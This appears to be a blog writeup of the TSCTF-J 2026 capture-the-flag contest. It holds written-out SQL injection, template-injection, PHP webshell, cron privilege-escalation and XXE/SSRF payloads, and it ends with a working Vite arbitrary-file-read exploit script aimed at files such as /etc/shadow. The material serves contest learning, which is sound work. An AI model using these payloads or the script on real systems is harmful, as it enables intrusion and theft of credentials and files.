---
title: "TSCTF-J 2026 Writeup"
published: 2026-10-15
description: "奶龙题，题目给出一张图是某品牌芒果干，在天猫超市转了一圈只看到了同品牌的另一款较大包芒果干，但是经过观察图像发现芒果干袋子的钩子是透明的，而天猫超市（以及后面的永年超市）的正常货架的钩子是非透明的圆柱状，又转了一圈发现之前忽略的在货架边上的一整条挂下来的商品有部分满足该现象，同时"
image: ""
tags: ["TSCTF-J"]
category: "CTF"
draft: false
---
> 部分题目步骤采用 dsh 或是网页版 ds 或是 bing、各路博客辅助思路。

## abstract

### Dried Milkdragon

奶龙题，题目给出一张图是某品牌芒果干，在天猫超市转了一圈只看到了同品牌的另一款较大包芒果干，但是经过观察图像发现芒果干袋子的钩子是透明的，而天猫超市（以及后面的永年超市）的正常货架的钩子是非透明的圆柱状，又转了一圈发现之前忽略的在货架边上的一整条挂下来的商品有部分满足该现象，同时观察到图片内芒果干袋子下方有同品牌该产品没有的花纹，而图片左下角有粉色的同款花纹——说明多种口味的该种芒果干在竖行同一处，所以推测这是货架侧面商品，天猫超市中货架侧面没有符合的商品。于是去永年超市，然后便找到目标，商品旁有一个意见本，翻到最后一页即为 flag 。

以上分析过程是无聊且懒得出去的时候想的，有助于加快一点点实地找的速度，其实只需要细心一点去遍历两个超市所有商品即可。

### emoji

发散能力不够，遂 Deepseek 解出答案。（以下为 ds 原话）

- 🌝🌚：明 + 月 → **明月**
- 👋：送别，谐音“松”
- 🚀：火箭有“箭”，谐音“间”
- 👋：招手，谐音“照”
- 😙：亲，谐音“清”
- 🤛：拳，谐音“泉”
- 🤛：拳头硬如石 → **石**
- 🌞：太阳在天上 → **上**
- 🌧️：下雨流水 → **流**

虽然我觉得这好雷霆啊这真的简单吗（？

## web
 
### 好想玩原神

首先观察界面，是个原神登录界面，尝试随便输入用户名与密码，返回零条通行证记录并且 redirect 到原神官网（x

尝试代码审计，查看源代码的时候发现注释中含有 checkit 的账号名单，随便挑选一个可以登录成功并且返回不知所云的通行证记录。通过 Yakit 进行全部账号尝试后发现返回的东西没有什么特殊的（如 cookie 等），遂猜测可能是 SQL 注入（？

首先使 `password:Windfall2407'` ，发现返回的内容变成了：

```json
{
  "detail": "OperationalError",
  "error": "登录网关解析失败"
}
```

上网查询后发现是 sqlite3 的常见错误，也就是说是字符型注入。尝试 sqlite 相关函数如 `sqlite_version()` ，构造 payload 时却一直发现出现 `403` 错误，查看返回体发现：

```json
{
  "error": "blocked by login firewall",
  "redirect": "https://ys.mihoyo.com/"
}
```

出现了 WAF ，通过逐个构造，发现注释如 `#` `/**/` `--` 等都被 ban 了，包括 `and` `or` 等也都被 ban 了，但是 `union` 居然是没有被 ban 的，这意味着出题人大概率是要我们用联合注入。现在问题变成如何在无法使用注释的情况下完成对 `password` 的后引号闭合或者是无效化。上网查询资料后发现可以通过 `||'` 的方式完成闭合，将整个查询语句拼凑为类似于 `select 1,2,3,'4'||''` 的样子。

要联合查询就要知道查询列数，从返回的 json 可以看出有四个项，故猜测有 4 列，发现确实如此。

```sql
Windfall2407' union select 1,2,3,'4'||'
```

然后就是拿表名列名之类的操作了：

```sql
Windfall2407' union select 1,2,3,(select group_concat(name) from sqlite_master where type='table')||'
Windfall2407' union select 1,2,3,(select group_concat(name) from pragma_table_info('secret_flags'))||'
Windfall2407' union select 1,2,3,(select flag_value from secret_flags)||'
```

### BandInvite

发现能注册，随便注册一个用户进去后，发现用户权限不够，则方向应该是想办法提权（？发现 `cookie` 处出现了一个类似 JWT 的 session ，推测要伪造 JWT。

然后用 hashcat + hashmob.net_2025.small.found 来爆破密钥，未成功，又尝试修改 `alg:none` 等方法均无法实现。说明密钥可能是强随机且 header 有校验，这条路大概率行不通。

在审计源码时发现了一个 `<script type="module" src="/@vite/client"></script>` ，上网查询后发现这大概率是开发环境下源码没有打包直接放到生产环境下，这意味着可以获取 `package.json` ，成功在里面找到了 vite 版本号 `8.0.4` 。搜索相关版本的 CVE 漏洞，找到了一个很有用的任意文件读写漏洞 —— **CVE-2026-39363** ，从 github 上找到相关的利用脚本（[GitHub - sunynov/CVE-2026-39363: 方便实用的CVE-2026-39363利用工具 · GitHub](https://github.com/sunynov/CVE-2026-39363)），利用 ds 修改了 “缺少发 TLS SNI”（不是很清楚，可能是 tsctf 的服务端配置中要求了不发 SNI 就拒绝完成 TLS 握手？） 的漏洞以后尝试用其连接在页面的 `Audit Logs` 里提到的 `/run/starry/dispatch-note.txt` 并且成功获取内容：

```
ticket: handoff-9c2e7b41
roster: GET /api/dispatch/roster?ticket=...
open shift: shift-0727
claim hint: POST /api/dispatch/shift-0727/...
Check roster before claiming; keep the same session.
Preview helper: press_kit.attachment(filename, ticket)
```

修改后脚本会贴在博客最后，另外利用 dsh 在常见出现 flag 的地方进行遍历，最终在 `/flag` 发现了 flag，但是由于权限问题无法读取，先记下这个路径：

```
[!] read failed: Error: EACCES: permission denied, open '/flag'
```

先 GET `roster` 可以得到：

```json
[
  {
    "assigned_to": "seika",
    "date": "2026-07-27",
    "duty": "notice_review",
    "id": "shift-0727",
    "status": "open"
  },
  {
    "assigned_to": "nijika",
    "date": "2026-08-02",
    "duty": "live_check",
    "id": "shift-0802",
    "status": "open"
  },
  {
    "assigned_to": "ryo",
    "date": "2026-08-11",
    "duty": "budget_review",
    "id": "shift-0811",
    "status": "closed"
  }
]
```

然后猜测 claim 路径的省略号指代的应该就是 claim ，POST 后提示：

```json
{ "error": "dispatch ticket required" }
```

加上 GET 参数 `ticket=handoff-9c2e7b41` 即可：

```json
{
  "ok": true,
  "role": "admin"
}
```

此时登录账号发现自己已经变成了 `admin` 身份，可以访问通知预览了。

> [!warning] 注意如果直接 POST claim 会返回 `"error": "roster confirmation required"` ，此事在 `dispatch-note.txt` 中亦有记载—— `Check roster before claiming; keep the same session.`。

由于发出去的通知根本没有回显，有些没思路了，于是让 dsh 拿着 admin 身份跑了接口，根据 dsh 发现，当且仅当通知类型为 “临时公告” 即 `custom_stage_notice` 时服务端会进行模板渲染，并且将渲染的成功与否以 `archived/failed` 的状态返回，这也对应了后面出题人发的 hint ：

> 开发人员和店长说，预览不会直接回显渲染结果，但是他忘了清理返回的布尔状态

对了 dsh 还发现了如果直接访问或者是在网页端访问的话会提示需要 ticket ，解决方法是在请求体的 `variables` 处增加一个字段 `ticket` 并设值为 `handoff-9c2e7b41` 即可。

尝试注入，发现 `__` 、`import` 等关键词返回 `"error": "notice body rejected by publishing policy"` ，则问题变成了 Jinja2 上下文 pyjail + 字符串 WAF 。

字符串很好绕过，我们可以使用比如 `'o'~'s'` 来构造 `os` 等黑名单里的字符串 ，使用 `.|attr()` 来代替点号的调用。但是绕过这一层后就陷入了死胡同，所有常规的沙箱逃逸手段全部无效，甚至拿 dsh 对我知道的和我不知道的所有逃逸方法都跑了一遍，完全无法读到文件 `/flag` 。

去请教出题人，出题人这时候给了个 hint ，才发现我漏掉了 `dispatch-note.txt` 的最后一行：

```
Preview helper: press_kit.attachment(filename, ticket)
```

也就是说沙箱里难道预留了一个工具函数可以读取文件？尝试以下代码：

```jinja2
{% if press_kit is defined %}OK{% else %}{{ 1/0 }}{% endif %}
{% if press_kit|attr('attachment') is callable %}OK{% else %}{{ 1/0 }}{% endif %}
{% if (press_kit.attachment('/f'~'lag', ticket)) is string %}OK{% else %}{{ 1/0 }}{% endif %}
{% if (press_kit.attachment('/f'~'lag', ticket)[0]) is defined %}OK{% else %}{{ 1/0 }}{% endif %}
```

以上结果皆为成功，说明可以通过 `press_kit.attachment()` 返回的字符串按下标一位一位进行布尔二分从而拿到 flag ，让 ds 写了相关代码，以 `{% if (press_kit.attachment('/f'~'lag', ticket)[i]) == 'T' %}A{% else %}{{1/0}}{% endif %}` 这种方式来将任何表达式的布尔转化为是否抛出异常，成功拿到 flag 。

> [!warning] 这边要注意的是由于 flag 文件末尾存在换行符，所以在读到 `}` 后还会读取出一位字符，需要注意程序的设计。

### 玛德莱娜小蛋糕

整个页面只有一个上传 GIF 图片的操作空间，推测考点是图片木马。刚开始还是用 `copy /b` 将真实 GIF 和 PHP Payload 拼接，后来一次偶然的尝试发现只需要在文件开头添加魔数 `GIF89a` 即可绕过检验，省了一步 `copy` 操作。

当上传包含 `<?php`（大小写不敏感）时会发现类似 “管理员嗅到了浓浓的 php 味道” 之类的话，考虑绕过，尝试修改为 `<?=` ，发现成功上传了，从而成功构造 RCE 。

下一步对系统进行分析，最后在根目录下发现 `flag` ，发现是 `600` ，拥有者是 `root` ，而我们目前拿到的权限肯定是不够 `root` 的，则下一步应该是提权。

在根目录发现了一个非常规文件 `entrypoint.sh` 交给 ds 分析后得到了一个关键词是 `cron` ，查询后得知这是 linux 的定时任务管理工具，于是尝试读取以下路径：

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
ls -la /var/spool/cron/crontabs/
```

在 `/etc/cron.d/` 中发现了以下内容：

```
-rw-r--r-- 1 root root   99 Oct  3 13:11 teahouse-cleanup
```

读取后得到：
```
* * * * * root /bin/bash /opt/teahouse/bin/clean_uploads.sh >> /var/log/teahouse-cleanup.log 2>&1
```

从而发现以 root 权限启动的定时任务并获得其内容：

```bash
#!/bin/bash
set -u

UPLOAD_DIR="/var/www/html/storage/tmp"
PROFILE_FILE="/var/lib/teahouse/cleanup.conf"

if [ ! -d "$UPLOAD_DIR" ]; then
    exit 0
fi

if [ -f "$PROFILE_FILE" ]; then
    source "$PROFILE_FILE"
fi

# The teahouse keeps albums tidy by sweeping oversized or stale temporary desserts.
find "$UPLOAD_DIR" -type f -size +"${MAX_UPLOAD_SIZE:-1M}" -delete
find "$UPLOAD_DIR" -type f -mmin +"${UPLOAD_TTL_MINUTES:-3}" -delete
find "$UPLOAD_DIR" -type f -mmin +"${UPLOAD_TTL_MINUTES:-3}" -delete
```

查询后发现其中的 `source` 命令能够以当前命令的权限来执行后面跟的参数所指向的文件，则如果能够修改该文件即可达到 `sudo` 的效果从而读取 `flag` 。由于定时任务的回显无法读取，所以只能使定时任务能够修改 `flag` 为 `644` 即可。

另外好像直接修改 `flag` 的权限不行，要先复制一下去修改复制的文件的权限（？

```bash
curl -k "https://79546a564770794f7565515a5937384d39476e5762-p80.chal.buptmerak.cn/storage/tmp/32db9bf55d1d.phtml?cmd=echo%20%27cp%20/flag%20/var/www/html/flag%3Bchmod%20644%20/var/www/html/flag%27%3E/var/lib/teahouse/cleanup.conf%26%26echo%20ok"
curl -k "https://79546a564770794f7565515a5937384d39476e5762-p80.chal.buptmerak.cn/storage/tmp/32db9bf55d1d.phtml?cmd=cat%20/var/www/html/flag"
```

### MinePortrait

打开后发现是个星露谷的登陆界面，尝试随便输入账号密码，提示 `Invalid workshop badge.`。

尝试查看 `robots.txt` ，发现 `Disallow: /www.zip` ，成功下载到两个文件。其中的 Python 文件展示了一个账号密码：

```python
# leaked login source
USERNAME = "m0rnis"
PASSWORD = "passw0rd"

def check_login(username, password):
    if username == USERNAME and password == PASSWORD:
        return True
    return False
```

尝试后成功登录进去，注意到得到了一个 `session: junimo-session-m0rnis` ，比较奇怪的是是明文，尝试修改为 `admin` 后发现要重新登录，暂时没发现有什么突破口。

再看登录后的界面是一个类似于图片格式转化的功能，难道跟玛德莱娜一样是文件上传漏洞吗？在进行了简单的前端代码审计后发现 `submit` 被监听阻止默认事件并且在本地用 canvas 做了一个伪转化，但是有个关键的判断：

```js
if (source === "svg" && target === "png") {
	const text = await blobToText(file);
	if (/<!\s*(doctype|entity)|SYSTEM\s+["']/i.test(text)) {
		setStatus("Sending SVG to the workshop renderer...");
		return;
	}
}
```

也就是说当原来的图为 svg ，目标转化为 png 时，会直接上传而不是本地伪转化。本地找了个 svg 上传一下，发现会先显示该 svg ，然后 submit 成功，服务端返回一个带有信纸背景的文字图 `Portrait conversion completed.` 。这里请教 `m0rnis` 学长后得知 `svg2png` 是经典的一个问题，于是在写 wp 时上网查询相关关键词，得知 svg 实际上支持 js 和 xml 的一些标准，而这里的 xml 就会带来一个经典问题即 XXE ，同时 js 还会带来 XSS 问题。

在上传其他带有图像的 svg 时只会返回同一段文本，而只有 `<text></text>` 的 svg 就会显示 text 的内容，所以 XXE 的方向应该就是通过读取外带 flag 到返回的图中来。

注意到本题 `www.zip` 给出的另一个文件中有提到：

```
# old_note.txt
# Pelican Town workshop internal notes
#
# private media helper:
#   service = 127.0.0.1
#   route = /fetch.php
#   query = url
# flag in flag.txt
# The media helper is only reachable from the workshop network.
# It was kept for legacy artwork imports used by older portrait tools.
```

也就是说存在一个可以通过 url 获取东西的服务只在 workshop network 可访问。前期排查突破口时有尝试通过修改 `host` 、`xxf` 的方式来访问均失败，而现在我们访问的 `/convert` 的确是处在 workshop network 的，也就是说我们接下来就是要想办法让该接口去访问那个服务从而拿到 flag 。

```xml
<!DOCTYPE svg [<!ENTITY e SYSTEM "http://example.com/">]>
<svg><text>&e;</text></svg>
```

返回 `The Junimos found sensitive keywords within your XML. Go refine it!` 说明存在关键词过滤器，经过多番尝试后发现关键词是 `<!DOCTYPE>` ，但是可以通过在其中添加空格来绕过（这里不能使用编码转换来绕过，因为这样会使得 `<text>` 不被正则匹配导致返回的值只为默认的 `Portrait conversion completed.` ）：

```xml
<! DOCTYPE svg [<! ENTITY e SYSTEM "http://127.0.0.1/">]>
<svg><text>&e;</text></svg>
```

返回 `Remote media URL rejected: 127.0.0.1/` ，查询后得知这是一个典型的 SSRF 过滤拦截。当服务器试图请求远程媒体资源时，它会检查 url 中的主机地址，一旦发现是 `127.0.0.1` 或 `localhost` 就会拒绝。而绕过方法有很多，以下列出对于本题可以绕过的方法：

```
http://2130706433/      # 十进制
http://0x7f000001/      # 十六进制
http://0177.0.0.1/      # 八进制
http://0x7f.1/       # 十六进制 + 短写
http://[::ffff:127.0.0.1]/      # IPV6
http://[::ffff:7f00:1]/      # IPV6
```

以上这些会返回 `Conversion failed: HTTP Error 404: Not Found` ，说明真的连上了。还有一些绕过方法本题仍然会被拒绝：

```
http://127.1/      # 短写
http://expected.com@127.0.0.1/      # userinfo 混淆
http://127.0.0.1\@allowed.com/      # 反斜杠路径混淆
```

接下来如果直接使用 url 去访问 `/flag.txt` 的话会返回 `media source rejected: missing media adapter` ，根据好心出题人的 hint ：

> 祝尼魔们会拦下不少本机地址，却会收下用filter包好的信。

可知应当使用 `php://filter` 进行一下流包装，选用 `base64` 即可。

```
http://[::ffff:7f00:1]/fetch.php?url=php%3A//filter/convert.base64-encode/resource%3D%2Fflag.txt
```

最终得到的 base64 拿去解码即可获得 flag 。

## misc

> 由于这次主要打的方向是 web ，且由于是第一次将 agent 应用在 ctf 中不太会引导 agent ，加上复盘 agent 做题过程花的时间久，导致本来想花时间打的 misc 方向基本上没有实际参与，只是拿 dsh 尝试了几道题，以下题解是尽量尝试整理 ds 的做法所写的。

### play it

签到题，找个解数独的网站，然后写下 python 脚本去批量发送 `set` 命令，最后 `submit` 即可。

以下为脚本：

```python
#!/usr/bin/env python3
from pwn import *
import sys

HOST = "747264534a636730614e30344b56526d487a68635a-p9999.chal.buptmerak.cn"
PORT = 443

# 如果题目里的行列是从 1 开始的，把 BASE 改成 1
# 如果是从 0 开始的，保持 0
BASE = 1

context.log_level = 'info'

def recv_all(timeout=2):
    data = b''
    while True:
        try:
            chunk = p.recv(timeout=timeout)
        except EOFError:
            break
        if not chunk:
            break
        data += chunk
        sys.stdout.write(chunk.decode(errors='replace'))
        sys.stdout.flush()
    return data

p = remote(HOST, PORT, ssl=True, sni=HOST)

print("[+] 已连接，服务端初始返回：")
recv_all(timeout=2)

print("\n[+] 请输入 9x9 数独矩阵")
print("    0 表示空格；每行 9 个数字，可空格分隔或连续输入")
grid = []
for i in range(9):
    while True:
        line = input(f"第 {i+1} 行: ").strip()
        if not line:
            continue

        parts = line.split()
        if len(parts) == 9:
            nums = parts
        else:
            digits = [ch for ch in line if ch.isdigit()]
            if len(digits) == 9:
                nums = digits
            else:
                print("格式错误，请重新输入这一行")
                continue

        grid.append(nums)
        break

print("[+] 开始发送 set 命令...")
for r in range(9):
    for c in range(9):
        n = int(grid[r][c])
        if n != 0:
            cmd = f"set {r + BASE} {c + BASE} {n}\n"
            p.send(cmd.encode())

print("[+] 发送完毕，接收服务端返回：")
recv_all(timeout=3)

print("\n[+] 进入交互模式，可继续手动操作，Ctrl-C 退出")
p.interactive()

# 第 1 行: 912487356
# 第 2 行: 734651829
# 第 3 行: 586392471
# 第 4 行: 468539712
# 第 5 行: 371264598
# 第 6 行: 295178634
# 第 7 行: 153826947
# 第 8 行: 827943165
# 第 9 行: 649715283
```

### findit

附件给了 100 个 mp3 ，要在多轮中内完成对指定预处理后的音频段找出其所在的音频以及起始点，查询后得知 **Chroma 特征** 适用于这种预处理后的音频特征识别，所以可以写一个程序来进行特征库建立与自动化识别。

然而后来发现附件没有给 bgm ，只建立 track 的特征库远不够答对，但是在 dsh 的努力下，其抓了一些服务端的音频到本地一阵分析，最后使用了一个 **逐带 z-score 归一** 给解决了。ds 的解决程序在博客结尾给出。

> **逐带 z-score 归一**就是“每个波段各自减自己的均值、除自己的标准差”，使各波段均值为 0、标准差为 1。—— deepseek
> BGM 在对数幅度域近似为每带的常量偏移，逐带减均值除标准差正好把它消掉，让匹配依赖语音的频谱形状而非共享的 BGM。—— deepseek

### !\_MisC\_!（未做出）

先尝试用 `zsteg` 扫了一遍 `icon.png` ，没发现任何问题，然后又用 `grep` 命令扫了一遍目录未发现 flag 标志。

通过查看 `level.dat` 发现地图版本为 `26.3`（后来发现怎么题面有写版本，建议把版本列为 misc 一环（）），用对应版本我的世界进入后发现是个巨大的红石电路构成的一个解谜，转了一圈发现看不懂红石电路（寄）

PIP 下载 `Amulet-Core` 后将存档交给 dsh 去分析，但是这方法明显不对，消耗大量 tokens 后无果，暂时放弃。

后面搜索各种方案找到一种常见的不用 dsh 自己按字节从零去分析 NBT 的方法：**WorldEdit 导出选取 + Nucleation 模拟** 。然后就是漫长的 AI 试错 + 分析了。然而仍然未做出来。

hint1 的意思大概是调随机刻？hint2 指明了按钮十六进制是 flag 编码后结果。

## AI

### Liar’s Bar

红温指数估计是 `temperature` 吧设为 `0.1` ，提示词如下（由 ds 生成）：

```
硬性规则：
1. 自己左轮空枪 0-1：可谨慎质疑，可出 1 张假。
2. 自己空枪 2：不主动质疑，除非对方出 3 张且历史可疑；不出假。
3. 自己空枪 3 及以上：绝不主动质疑，除非强制；只出真牌或 JOKER；有恶魔牌单独出。
4. 自己空枪 4 及以上：强制质疑也认命；出牌只用真牌/JOKER/恶魔，绝不主动出假。
出牌优先级：
真桌牌 > JOKER > 恶魔牌 > 假牌。
一次最多出 2 张，优先 1 张。
有真牌出真牌。
无真牌有 JOKER 出 JOKER。
无真无 JOKER，出恶魔牌，单独出。
以上都没有，才出 1 张假牌。
永远不出 2 张以上假牌。
恶魔牌：
每轮拿到后，尽早单独出，声称是桌牌。
最好在对手空枪≥2 或对手质疑倾向强时出。
被质疑则自己免枪，其他所有人扣扳机。
JOKER：
永远合法，留到关键局，尤其是自己可能成为最后有牌者时。
最后有牌时，尽量出 JOKER 或真牌，让强制质疑者扣扳机。
质疑：
质疑前默算自己死亡概率 = 1/(6-自己空枪数)。
如果死亡概率 > 20%，不主动质疑。
对方出 1 张：基本不质疑，除非自己空枪 0 且对方是惯骗。
对方出 2 张：自己空枪≤1 且对方历史可疑，才质疑。
对方出 3 张：自己空枪≤2 且对方非诚实形象，才质疑。
对方单张且像诱质疑：不质疑，防恶魔牌。
强制质疑：
只剩一人有牌或全场无手牌时，必须质疑。
提前避免自己成为最后有牌者。
如果自己最后有牌，确保出真牌/JOKER/恶魔。
对手建模：
常质疑者：少出假，多出真，诱其质疑失败；恶魔牌收益高。
少质疑者：可多出假，但恶魔牌诱饵效果差。
常撒谎者：多质疑，但防恶魔牌。
风险厌恶者：用假牌施压。
风险偏好者：少出假，等他质疑失败。
决策顺序：
先看自己空枪数，再看对手空枪数，再看对方出牌数量与历史，最后决定。
```

最终单次 21 轮过关，扳机 2 / 6 。自己又写了一版：

```
对对手进行建模：你的对手大概有两种人，一种质疑较多，一种质疑较少，质疑较多的请你诱导其质疑失败，尤其是恶魔牌时，质疑较少的只在你有充足把握且当前空枪<=3时发出质疑。当对手一次性出三张牌的时候质疑成功的概率极高，但是要保证自己有足够的空枪数来操作。一次性出两张牌时质疑成功的概率也较高，但是这时候要小心了，注意对手可能出过小丑牌，有则质疑成功的概率下降至极低。对手出一张牌的时候仅在对手已经出的合法牌（包括小丑牌等）足够多时才能够质疑。一次最多出2张，优先1张。确保自己最后一张牌为真牌。在场上质疑较多的人基本都倒下后，可以尝试多在前期使用假牌，否则假牌不优先。
前期不要主动质疑，除非百分百确定，等待其他人内耗而亡。
当只剩下你和另一个人的时候质疑一定要有百分之九十把握的时候才发出，因为对面大概率是不质疑之人，就等你犯错。
```

红温指数设置为 `0.2` 。最终单次 12 轮过关，扳机 2 / 6 。

> 不过这题也还是有运气成分的，否则如果只有一两枪容错其实也挺难的。

## 附录

### BandInvite CVE-2026-39363 利用脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-39363 — Vite dev server 任意文件读取（HMR WebSocket 未授权）

Affected : vite >=6.0.0 <=6.4.1 | >=7.0.0 <=7.3.1 | >=8.0.0 <=8.0.4
Fixed    : 6.4.2 / 7.3.2 / 8.0.5
Advisory : GHSA-p9ff-h696-f583

原理
----
dev server 暴露到网络（server.host / --host）且未关闭 HMR WebSocket 时，
WS 握手只要【不带 Origin 头】即可绕过 token 校验（CWE-306）。
随后向 HMR WebSocket 发送自定义事件 `vite:invoke` 调用服务端 `fetchModule`，
传入 `file://<绝对路径>?raw`，即可读取任意文件——
该执行路径【完全绕过 HTTP 层的 server.fs.allow 限制】（CWE-200）。

本脚本相对常见 PoC 的关键修正
------------------------------
1) TLS 必须发送 SNI：`ctx.wrap_socket(sock, server_hostname=host)`。
   很多 PoC 写成 `ctx.wrap_socket(sock)`，在按 SNI 分流的反向代理后面
   会拿到 `404 page not found`（看起来像目标不存在，实际只是没发 SNI）。
2) 校验 Sec-WebSocket-Accept。
3) file:// URL 正确处理 POSIX / Windows / UNC 三种路径。
4) 帧收发按 RFC6455（客户端帧强制掩码、支持 126/127 变长、ping→pong）。

用法
----
  python cve_2026_39363_read.py https://HOST:PORT /etc/passwd
  python cve_2026_39363_read.py https://HOST:PORT /etc/passwd /proc/self/environ -o out/
  python cve_2026_39363_read.py https://HOST:PORT --host-header localhost:5173 /etc/shadow

免责声明：仅用于已获授权的安全测试。
"""

import argparse
import base64
import hashlib
import json
import os
import re
import socket
import ssl
import struct
import sys
import time
import urllib.parse

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
RAW_RE = re.compile(r'export\s+default\s+("(?:[^"\\]|\\.)*")', re.S)

if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):
        pass


# ------------------------------------------------------------------ helpers

def to_file_url(path: str) -> str:
    """把绝对路径转成 Vite fetchModule 能解析的 file:// URL。"""
    p = path.replace("\\", "/")
    if re.match(r"^[A-Za-z]:/", p):      # C:/x/y  -> file:///C:/x/y
        return "file:///" + p
    if p.startswith("//"):               # //host/share -> file://host/share
        return "file:" + p
    if p.startswith("/"):                # /etc/passwd -> file:///etc/passwd
        return "file://" + p
    return "file:///" + p


def _xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % 4] for i, b in enumerate(data))


def recv_exact(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("connection closed by peer")
        buf += chunk
    return buf


def send_frame(sock, payload: bytes, opcode: int = 0x1) -> None:
    mask = os.urandom(4)
    n = len(payload)
    head = bytearray([0x80 | opcode])
    if n < 126:
        head.append(0x80 | n)
    elif n < 65536:
        head.append(0x80 | 126)
        head += struct.pack(">H", n)
    else:
        head.append(0x80 | 127)
        head += struct.pack(">Q", n)
    sock.sendall(bytes(head) + mask + _xor(payload, mask))


def recv_frame(sock):
    b1, b2 = recv_exact(sock, 2)
    opcode = b1 & 0x0F
    n = b2 & 0x7F
    if n == 126:
        n = struct.unpack(">H", recv_exact(sock, 2))[0]
    elif n == 127:
        n = struct.unpack(">Q", recv_exact(sock, 8))[0]
    mask = recv_exact(sock, 4) if (b2 & 0x80) else None
    payload = recv_exact(sock, n)
    if mask:
        payload = _xor(payload, mask)
    return opcode, payload


# ------------------------------------------------------------------ websocket

def ws_connect(host, port, path, tls, host_header, timeout, origin=None, sni=True):
    """完成 HTTP Upgrade 握手。origin=None 是关键：不发送 Origin 头。"""
    raw = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        # ★ 关键修正：必须带 SNI，否则按 SNI 分流的反代会返回 404
        raw = ctx.wrap_socket(raw, server_hostname=host if sni else None)
    raw.settimeout(timeout)

    key = base64.b64encode(os.urandom(16)).decode()
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host_header}",
        "Upgrade: websocket",
        "Connection: Upgrade",
        f"Sec-WebSocket-Key: {key}",
        "Sec-WebSocket-Version: 13",
        "Sec-WebSocket-Protocol: vite-hmr",
        "User-Agent: Mozilla/5.0 (compatible; CVE-2026-39363)",
    ]
    if origin:
        lines.append(f"Origin: {origin}")
    raw.sendall(("\r\n".join(lines) + "\r\n\r\n").encode())

    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = raw.recv(4096)
        if not chunk:
            raise ConnectionError("handshake closed by peer")
        buf += chunk
    head = buf.split(b"\r\n\r\n", 1)[0].decode("latin-1")
    status_line = head.split("\r\n")[0]
    if " 101 " not in status_line:
        raise RuntimeError(f"WS handshake rejected: {status_line}")

    expect = base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()
    for line in head.split("\r\n")[1:]:
        if line.lower().startswith("sec-websocket-accept:"):
            if line.split(":", 1)[1].strip() != expect:
                raise RuntimeError("Sec-WebSocket-Accept mismatch")
            break
    return raw


def fetch_module(sock, file_url, rid, timeout):
    """调用服务端 fetchModule(file_url)。"""
    msg = {
        "type": "custom",
        "event": "vite:invoke",
        "data": {"name": "fetchModule", "id": rid, "data": [file_url]},
    }
    send_frame(sock, json.dumps(msg).encode())
    expect_id = rid.replace("send", "response")
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            raise TimeoutError("no response from vite:invoke")
        sock.settimeout(remaining)
        opcode, payload = recv_frame(sock)
        if opcode == 0x8:
            raise ConnectionError("server closed websocket")
        if opcode == 0x9:                      # ping -> pong
            send_frame(sock, payload, opcode=0xA)
            continue
        if opcode != 0x1:                      # 只处理文本帧
            continue
        try:
            obj = json.loads(payload.decode("utf-8", "replace"))
        except (ValueError, UnicodeDecodeError):
            continue
        if obj.get("type") != "custom" or obj.get("event") != "vite:invoke":
            continue
        d = obj.get("data") or {}
        if d.get("name") != "fetchModule" or d.get("id") != expect_id:
            continue
        inner = d.get("data") or {}
        if "error" in inner:
            err = inner["error"] or {}
            raise RuntimeError(f"{err.get('name')}: {err.get('message')}")
        return inner.get("result") or {}


def unwrap(code: str):
    """`export default "..."` -> 原始文件内容。"""
    m = RAW_RE.search(code or "")
    if not m:
        return None
    try:
        return json.loads(m.group(1))
    except ValueError:
        return None


def drain_welcome(sock, timeout=1.0):
    """吃掉握手后的 connected / update 等欢迎帧。"""
    sock.settimeout(timeout)
    try:
        while True:
            opcode, payload = recv_frame(sock)
            if opcode == 0x9:
                send_frame(sock, payload, opcode=0xA)
                continue
            if opcode != 0x1:
                continue
            try:
                if (json.loads(payload) or {}).get("type") == "connected":
                    return
            except ValueError:
                continue
    except (socket.timeout, ConnectionError, OSError):
        return


# ------------------------------------------------------------------ main

def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-39363 Vite dev server arbitrary file read",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s https://target:5173 /etc/passwd\n"
               "  %(prog)s https://target:5173 /etc/passwd /proc/self/environ -o out/\n"
               "  %(prog)s https://target:5173 --host-header localhost:5173 /etc/shadow\n")
    ap.add_argument("url", help="target URL, e.g. https://host:5173")
    ap.add_argument("files", nargs="+", help="absolute paths to read")
    ap.add_argument("--ws-path", default="/", help="HMR websocket path (default /)")
    ap.add_argument("--host-header", default=None, help="override Host header")
    ap.add_argument("--origin", default=None,
                    help="set an Origin header (leave unset to bypass, which is required)")
    ap.add_argument("--no-sni", action="store_true", help="do NOT send TLS SNI (breaks SNI-routed proxies)")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("-o", "--output-dir", default=None)
    args = ap.parse_args()

    u = urllib.parse.urlsplit(args.url if "://" in args.url else "http://" + args.url)
    scheme = (u.scheme or "http").lower()
    if scheme not in ("http", "https"):
        sys.exit(f"[!] bad scheme: {args.url}")
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if scheme == "https" else 80)
    host_header = args.host_header or (host + (f":{port}" if port not in (80, 443) else ""))
    tls = scheme == "https"

    print(f"[*] connecting wss://{host}:{port}{args.ws_path}  (Host: {host_header}, SNI: {not args.no_sni})")
    try:
        sock = ws_connect(host, port, args.ws_path, tls, host_header,
                          args.timeout, origin=args.origin, sni=not args.no_sni)
    except Exception as e:
        sys.exit(f"[!] connect failed: {e}")
    drain_welcome(sock)
    sock.settimeout(args.timeout)
    print("[+] HMR WebSocket upgraded (no Origin header -> token check bypassed)")

